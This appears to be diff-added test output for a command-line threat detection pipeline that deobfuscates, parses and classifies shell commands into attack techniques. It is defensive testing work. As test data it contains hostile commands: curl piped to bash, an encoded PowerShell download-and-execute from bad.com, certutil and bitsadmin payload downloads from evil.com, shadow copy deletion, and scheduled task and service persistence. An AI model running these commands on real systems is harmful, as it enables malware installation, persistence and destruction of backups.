+  ✓ writes_executable_like_file
+  ✓ has_local_target
+  ✓ modifies_registry_autorun
+  ✓ uses_signed_proxy_binary
+
+RULE ENGINE:
+  candidate_classes:
+    persistence:registry_run_key
+    defense_evasion:signed_binary_proxy_execution
+  banned_classes:   []
+  priors:
+    persistence:registry_run_key → 0.95
+  evidence:
+    registry_autorun: write to autorun key [HKCU\Software\Microsoft\Windows\CurrentVersion\Run]
+    registry_autorun: payload is executable-like file
+
+───────────────────────────────────────────────────────────────────────────────
+
+RULE TEST #2: Scheduled Task Persistence
+─────────────────────────────────────────
+COMMAND:
+  schtasks /create /tn updater /tr evil.exe /sc onlogon
+
+DEOBFUSCATOR:  not obfuscated — passthrough
+
+PARSER:
+  executable:      schtasks
+  platform:        windows
+  flags:           [/create, /tn, /tr, /sc]
+  positional_args: [updater, evil.exe, onlogon]
+  file_paths:      [evil.exe]
+  local_targets:   [evil.exe]
+  lolbin_matches:  [schtasks]
+
+SEMANTIC:
+  ✓ writes_local_file
+  ✓ writes_executable_like_file
+  ✓ has_local_target
+  ✓ creates_scheduled_task
+  ✓ uses_signed_proxy_binary
+
+RULE ENGINE:
+  candidate_classes:
+    persistence:scheduled_task
+    defense_evasion:signed_binary_proxy_execution
+  banned_classes:   []
+  priors:
+    persistence:scheduled_task → 0.95
+  evidence:
+    scheduled_task: schtasks used to create/register a scheduled task
+    scheduled_task: task payload is executable-like
+
+───────────────────────────────────────────────────────────────────────────────
+
+RULE TEST #3: Ingress Tool Transfer — curl -o
+──────────────────────────────────────────────
+COMMAND:
+  curl -o payload.exe http://1.2.3.4/payload.exe
+
+DEOBFUSCATOR:  not obfuscated — passthrough
+
+PARSER:
+  executable:      curl
+  platform:        linux
+  flags:           [-o]
+  urls:            [http://1.2.3.4/payload.exe]
+  ips:             [1.2.3.4]
+  file_paths:      [payload.exe]
+  remote_targets:  [http://1.2.3.4/payload.exe]
+  local_targets:   [payload.exe]
+  lolbin_matches:  [curl]
+
+SEMANTIC:
+  ✓ downloads_remote_resource
+  ✓ writes_local_file
+  ✓ writes_executable_like_file
+  ✓ has_remote_target
+  ✓ has_local_target
+  ✓ uses_signed_proxy_binary
+
+RULE ENGINE:
+  candidate_classes:
+    command_and_control:ingress_tool_transfer
+    defense_evasion:signed_binary_proxy_execution
+  banned_classes:   []
+  priors:
+    command_and_control:ingress_tool_transfer     → 0.85
+    defense_evasion:signed_binary_proxy_execution → 0.40
+  evidence:
+    ingress_transfer: remote resource fetched from http://1.2.3.4/payload.exe
+    ingress_transfer: downloaded payload is executable-like
+    signed_proxy: curl is a signed proxy binary
+
+───────────────────────────────────────────────────────────────────────────────
+
+RULE TEST #4: Ingress + Inline Execution — curl | bash
+───────────────────────────────────────────────────────
+COMMAND:
+  curl http://1.2.3.4/install.sh | bash
+
+DEOBFUSCATOR:  not obfuscated — passthrough
+
+PARSER:
+  executable:          curl
+  platform:            linux
+  has_pipe:            true
+  pipe_operators:      [|]
+  urls:                [http://1.2.3.4/install.sh]
+  ips:                 [1.2.3.4]
+  remote_targets:      [http://1.2.3.4/install.sh]
+  interpreter_markers: [bash]
+  lolbin_matches:      [curl]
+
+SEMANTIC:
+  ✓ downloads_remote_resource
+  ✓ has_remote_target
+  ✓ runs_interpreter
+  ✓ uses_signed_proxy_binary
+
+RULE ENGINE:
+  candidate_classes:
+    command_and_control:ingress_tool_transfer
+    defense_evasion:signed_binary_proxy_execution
+    execution:command_and_scripting_interpreter
+  banned_classes:   []
+  priors:
+    command_and_control:ingress_tool_transfer        → 0.75
+    defense_evasion:signed_binary_proxy_execution    → 0.40
+    execution:command_and_scripting_interpreter      → 0.50
+  evidence:
+    ingress_transfer: remote resource fetched from http://1.2.3.4/install.sh
+    signed_proxy: curl is a signed proxy binary
+    ingress_transfer: piped directly to interpreter (curl|bash pattern)
+
+───────────────────────────────────────────────────────────────────────────────
+
+RULE TEST #5: Archive Collection / Staging
+───────────────────────────────────────────
+COMMAND:
+  tar -czf backup.tar.gz /home/user/data
+
+DEOBFUSCATOR:  not obfuscated — passthrough
+
+PARSER:
+  executable:         tar
+  platform:           linux
+  flags:              [-czf]
+  file_paths:         [backup.tar.gz, /home/user/data]
+  local_targets:      [backup.tar.gz, /home/user/data]
+  archive_indicators: [archive_tool, archive_create, compression_gzip, archive_path, backup_keyword]
+  lolbin_matches:     [tar]
+
+SEMANTIC:
+  ✓ writes_local_file
+  ✓ has_local_target
+  ✓ archive_create
+  ✓ compression_or_archiving
+  ✓ uses_signed_proxy_binary
+
+RULE ENGINE:
+  candidate_classes:
+    collection:archive_collected_data
+  banned_classes:   []
+  priors:
+    collection:archive_collected_data → 0.75
+  evidence:
+    archive_collection: tar used to create archive (possible staging/collection)
+
+───────────────────────────────────────────────────────────────────────────────
+
+RULE TEST #6: Encoded Execution + Download — PowerShell -EncodedCommand
+────────────────────────────────────────────────────────────────────────
+COMMAND:
+  powershell.exe -EncodedCommand SUVYKChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vYmFkLmNvbScpKQ==
+
+DEOBFUSCATOR:
+  Detected: -EncodedCommand flag + base64 blob
+  Layer 1 decode (base64 UTF-16LE):
+    → IEX((New-Object Net.WebClient).DownloadString('http://bad.com'))
+  Stable after 1 layer.
+
+PARSER (after deobfuscation, IOC extraction on decoded text):
+  executable:          powershell.exe
+  platform:            windows
+  flags:               [-EncodedCommand]
+  urls:                [http://bad.com]
+  domains:             [bad.com]          ← Net.WebClient suppressed by CamelCase filter
+  remote_targets:      [http://bad.com]
+  interpreter_markers: [powershell]
+  encoded_markers:     [encoded_command_flag, base64_blob]
+  obfuscation_markers: [encoded_command]
+  inline_code:         true
+  deobfuscated_command: IEX((New-Object Net.WebClient).DownloadString('http://bad.com'))
+
+SEMANTIC:
+  ✓ downloads_remote_resource
+  ✓ has_remote_target
+  ✓ uses_encoded_payload
+  ✓ uses_obfuscation
+  ✓ executes_inline_code
+  ✓ runs_interpreter
+  ✓ uses_signed_proxy_binary
+
+RULE ENGINE:
+  candidate_classes:
+    command_and_control:ingress_tool_transfer       (from download rule + encoded rule)
+    defense_evasion:signed_binary_proxy_execution   (from download rule + encoded rule)
+    defense_evasion:obfuscated_files_or_information (from encoded rule)
+    execution:command_and_scripting_interpreter     (from encoded rule)
+    defense_evasion:deobfuscate_decode_files        (from encoded rule, deob present)
+  banned_classes:   []
+  priors:
+    command_and_control:ingress_tool_transfer        → 1.00  (capped; download 0.75 + encoded 0.55)
+    defense_evasion:signed_binary_proxy_execution    → 0.90  (download 0.40 + encoded 0.50)
+    defense_evasion:obfuscated_files_or_information  → 0.75
+    execution:command_and_scripting_interpreter      → 0.80  (encoded 0.60 + inline 0.20)
+    defense_evasion:deobfuscate_decode_files         → 0.60
+  evidence:
+    ingress_transfer: remote resource fetched from http://bad.com
+    signed_proxy: powershell.exe is a signed proxy binary
+    encoded_execution: encoded/obfuscated payload detected [encoded_command_flag, base64_blob]
+    encoded_execution: inline code execution via interpreter flag
+    encoded_execution: payload decoded to → IEX((New-Object Net.WebClient).DownloadString('http://bad.com'))
+    encoded_execution: decoded payload downloads remote resource
+
+───────────────────────────────────────────────────────────────────────────────
+
+RULE TEST #7: WMI Remote Execution
+────────────────────────────────────
+COMMAND:
+  wmic process call create "cmd.exe /c whoami"
+
+DEOBFUSCATOR:  not obfuscated — passthrough
+
+PARSER:
+  executable:      wmic
+  platform:        windows
+  subcommand:      process
+  positional_args: [call, create, cmd.exe /c whoami]
+  lolbin_matches:  [wmic]
+
+SEMANTIC:
+  ✓ uses_signed_proxy_binary
+  ✓ remote_execution_or_session
+
+RULE ENGINE:
+  candidate_classes:
+    execution:windows_management_instrumentation
+    defense_evasion:signed_binary_proxy_execution
+  banned_classes:   []
+  priors:
+    execution:windows_management_instrumentation → 0.95  (base 0.80 + create 0.15)
+    defense_evasion:signed_binary_proxy_execution → 0.50
+  evidence:
+    wmi_exec: wmic process call detected (remote/local execution via WMI)
+    wmi_exec: 'create' keyword — spawning new process via WMI
+
+───────────────────────────────────────────────────────────────────────────────
+
+RULE TEST #8: Shadow Copy Deletion — Impact / Inhibit Recovery
+───────────────────────────────────────────────────────────────
+COMMAND:
+  vssadmin delete shadows /all /quiet
+
+DEOBFUSCATOR:  not obfuscated — passthrough
+
+PARSER:
+  executable:      vssadmin
+  platform:        windows
+  subcommand:      delete
+  flags:           [/all, /quiet]
+  positional_args: [shadows]
+  lolbin_matches:  [vssadmin]
+
+SEMANTIC:
+  ✓ uses_signed_proxy_binary
+  ✓ deletes_shadow_copies
+
+RULE ENGINE:
+  candidate_classes:
+    impact:inhibit_system_recovery
+  banned_classes:
+    command_and_control:ingress_tool_transfer   (hard-banned: logically impossible)
+    persistence:registry_run_key                (hard-banned: logically impossible)
+    persistence:scheduled_task                  (hard-banned: logically impossible)
+  priors:
+    impact:inhibit_system_recovery → 0.90
+  evidence:
+    shadow_deletion: vssadmin used to delete shadow copies (inhibit recovery)
+
+───────────────────────────────────────────────────────────────────────────────
+
+RULE TEST #9: Service Creation — Persistence
+─────────────────────────────────────────────
+COMMAND:
+  sc create updater binPath= C:\Users\Public\evil.exe
+
+DEOBFUSCATOR:  not obfuscated — passthrough
+
+PARSER:
+  executable:      sc
+  platform:        windows
+  subcommand:      create
+  positional_args: [updater, binPath=, C:\Users\Public\evil.exe]
+  file_paths:      [C:\Users\Public\evil.exe]
+  local_targets:   [C:\Users\Public\evil.exe]
+
+SEMANTIC:
+  ✓ writes_local_file
+  ✓ writes_executable_like_file
+  ✓ has_local_target
+  ✓ service_control
+  ✓ creates_or_modifies_service
+
+RULE ENGINE:
+  candidate_classes:
+    persistence:create_modify_system_process
+  banned_classes:   []
+  priors:
+    persistence:create_modify_system_process → 0.90  (base 0.80 + executable payload 0.10)
+  evidence:
+    service_creation: sc create — creates/modifies a system service
+    service_creation: service binPath points to executable-like file
+
+───────────────────────────────────────────────────────────────────────────────
+
+RULE TEST #10: Benign — ls
+───────────────────────────
+COMMAND:  ls
+PARSER:   executable: ls, platform: linux
+SEMANTIC: (none)
+RULE ENGINE:
+  candidate_classes: []     ← no rules fired
+  banned_classes:    []
+  priors:            {}
+  evidence:          []
+
+───────────────────────────────────────────────────────────────────────────────
+
+RULE TEST #11: Benign — pwd
+────────────────────────────
+COMMAND:  pwd
+PARSER:   executable: pwd, platform: linux
+SEMANTIC: (none)
+RULE ENGINE:
+  candidate_classes: []     ← no rules fired
+  banned_classes:    []
+  priors:            {}
+  evidence:          []
+
+───────────────────────────────────────────────────────────────────────────────
+
+RULE TEST #12: Benign (low-signal) — whoami
+────────────────────────────────────────────
+COMMAND:  whoami
+PARSER:   executable: whoami, platform: linux
+SEMANTIC: ✓ enumerates_identity
+RULE ENGINE:
+  candidate_classes:
+    discovery:account_discovery     ← discovery rule fired at low weight
+  banned_classes:   []
+  priors:
+    discovery:account_discovery → 0.45
+  evidence:
+    discovery: whoami — identity/account enumeration
+
+NOTE: Low prior (0.45) — rule acknowledges it is ambiguous. whoami is
+      common in both sysadmin workflows and post-exploitation enumeration.
+
+───────────────────────────────────────────────────────────────────────────────
+
+RULE TEST #13: Benign — systemctl status nginx
+───────────────────────────────────────────────
+COMMAND:  systemctl status nginx
+PARSER:   executable: systemctl, subcommand: status
+SEMANTIC: ✓ service_control
+RULE ENGINE:
+  candidate_classes: []     ← status query does not trigger service creation rule
+  banned_classes:    []
+  priors:            {}
+  evidence:          []
+
+───────────────────────────────────────────────────────────────────────────────
+
+RULE TEST #14: Benign — git clone
+───────────────────────────────────
+COMMAND:  git clone https://github.com/org/repo.git
+PARSER:   executable: git, subcommand: clone
+          urls: [https://github.com/org/repo.git]
+          domains: [github.com, repo.git]
+SEMANTIC: ✓ has_remote_target
+RULE ENGINE:
+  candidate_classes: []     ← git is not a DOWNLOAD_EXE; download rule does not fire
+  banned_classes:    []
+  priors:            {}
+  evidence:          []
+
+───────────────────────────────────────────────────────────────────────────────
+
+RULE TEST #15: Benign (low-signal) — ssh
+─────────────────────────────────────────
+COMMAND:  ssh user@192.168.1.10
+PARSER:   executable: ssh, platform: linux
+          ips: [192.168.1.10]
+          remote_targets: [user@192.168.1.10]
+SEMANTIC: ✓ transfers_file_to_remote, ✓ has_remote_target,
+          ✓ uses_signed_proxy_binary, ✓ remote_execution_or_session
+RULE ENGINE:
+  candidate_classes:
+    lateral_movement:remote_services
+  banned_classes:   []
+  priors:
+    lateral_movement:remote_services → 0.55
+  evidence:
+    remote_session: ssh session/transfer to user@192.168.1.10
+
+NOTE: Moderate prior (0.55) — ssh is standard sysadmin tooling but also
+      used for lateral movement. Specialist model provides final signal.
+
+───────────────────────────────────────────────────────────────────────────────
+
+RULE TEST #16: Benign — tar extract
+────────────────────────────────────
+COMMAND:  tar -xzf archive.tar.gz
+PARSER:   executable: tar, flags: [-xzf]
+          archive_indicators: [archive_tool, archive_extract, compression_gzip, archive_path]
+SEMANTIC: ✓ archive_extract  (NOT archive_create)
+RULE ENGINE:
+  candidate_classes: []     ← archive_create not set; collection rule does not fire
+  banned_classes:    []     ← ban only applied when archive_extract without archive_create
+  priors:            {}
+  evidence:          []
+
+───────────────────────────────────────────────────────────────────────────────
+
+RULE TEST #17: Shadow Copy Deletion via wmic
+─────────────────────────────────────────────
+COMMAND:  wmic shadowcopy delete
+PARSER:   executable: wmic, subcommand: shadowcopy
+          positional_args: [delete]
+SEMANTIC: ✓ uses_signed_proxy_binary, ✓ deletes_shadow_copies
+RULE ENGINE:
+  candidate_classes:
+    impact:inhibit_system_recovery
+  banned_classes:
+    command_and_control:ingress_tool_transfer
+    persistence:registry_run_key
+    persistence:scheduled_task
+  priors:
+    impact:inhibit_system_recovery → 0.90
+  evidence:
+    shadow_deletion: wmic used to delete shadow copies (inhibit recovery)
+
+───────────────────────────────────────────────────────────────────────────────
+
+RULE TEST #18: LOLBin Download — bitsadmin
+───────────────────────────────────────────
+COMMAND:
+  bitsadmin /transfer myJob /download /priority normal http://evil.com/payload.exe C:\temp\payload.exe
+
+PARSER:
+  executable:     bitsadmin
+  platform:       windows
+  flags:          [/transfer, /download, /priority]
+  urls:           [http://evil.com/payload.exe]
+  domains:        [evil.com]
+  file_paths:     [C:\temp\payload.exe]
+  remote_targets: [http://evil.com/payload.exe]
+  local_targets:  [C:\temp\payload.exe]
+  lolbin_matches: [bitsadmin]
+
+SEMANTIC:
+  ✓ downloads_remote_resource
+  ✓ writes_local_file
+  ✓ writes_executable_like_file
+  ✓ has_remote_target / has_local_target
+  ✓ uses_signed_proxy_binary
+
+RULE ENGINE:
+  candidate_classes:
+    command_and_control:ingress_tool_transfer
+    defense_evasion:signed_binary_proxy_execution
+  priors:
+    command_and_control:ingress_tool_transfer     → 0.85
+    defense_evasion:signed_binary_proxy_execution → 0.40
+  evidence:
+    ingress_transfer: remote resource fetched from http://evil.com/payload.exe
+    ingress_transfer: downloaded payload is executable-like
+    signed_proxy: bitsadmin is a signed proxy binary
+
+───────────────────────────────────────────────────────────────────────────────
+
+RULE TEST #19: LOLBin Download — certutil
+──────────────────────────────────────────
+COMMAND:
+  certutil -urlcache -split -f http://evil.com/shell.exe C:\shell.exe
+
+PARSER:
+  executable:     certutil
+  platform:       windows
+  flags:          [-urlcache, -split, -f]
+  urls:           [http://evil.com/shell.exe]
+  domains:        [evil.com]
+  file_paths:     [C:\shell.exe]
+  remote_targets: [http://evil.com/shell.exe]
+  local_targets:  [C:\shell.exe]
+  lolbin_matches: [certutil]
+
+SEMANTIC:
+  ✓ downloads_remote_resource
+  ✓ writes_local_file
+  ✓ writes_executable_like_file
+  ✓ has_remote_target / has_local_target
+  ✓ uses_signed_proxy_binary
+
+RULE ENGINE:
+  candidate_classes:
+    command_and_control:ingress_tool_transfer
+    defense_evasion:signed_binary_proxy_execution
+  priors:
+    command_and_control:ingress_tool_transfer     → 0.85
+    defense_evasion:signed_binary_proxy_execution → 0.40
+  evidence:
+    ingress_transfer: remote resource fetched from http://evil.com/shell.exe
+    ingress_transfer: downloaded payload is executable-like
+    signed_proxy: certutil is a signed proxy binary
+
+═════════════════════════════════════════════════════════════════════════════════
+
+FINAL SUMMARY
+─────────────
+
+Total Tests Run: 135
+  • validate_parser.py:             12/12  passed ✓
+  • validate_hybrid_foundation.py: 104/104 passed ✓
+  • validate_rule_engine.py:        19/19  passed ✓
+
+Pipeline layers tested end-to-end:
+  deobfuscation → parser → semantic features → rule engine
+
+Status: ALL GREEN
+
+═════════════════════════════════════════════════════════════════════════════════
